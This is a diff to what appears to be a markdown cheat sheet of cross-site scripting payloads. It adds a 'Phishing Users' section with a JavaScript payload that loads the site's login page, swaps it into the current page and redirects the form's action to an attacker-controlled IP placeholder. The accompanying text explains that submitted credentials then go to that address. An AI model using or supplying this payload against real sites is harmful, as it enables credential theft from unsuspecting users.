@@ -115,6 +115,20 @@ setTimeout(function() {
 }, 5000);
 ```
 
+### Phishing Users
+
+To perform a phishing attack and redirect users to a malicious login page:
+```
+fetch("login").then(res => res.text().then(data => {
+    document.getElementsByTagName("html")[0].innerHTML = data;
+    document.getElementsByTagName("form")[0].action = "http://<ip>";
+    document.getElementsByTagName("form")[0].method = "get";
+}));
+```
+
+This code fetches the contents of the "login" page, replaces the current HTML with the fetched content, modifies the form's action attribute to point to your IP address, and changes the form's method to "get". This way, when users submit their login credentials, the data will be sent to your specified IP address.
+
+
 ---
 
 ## Contribution
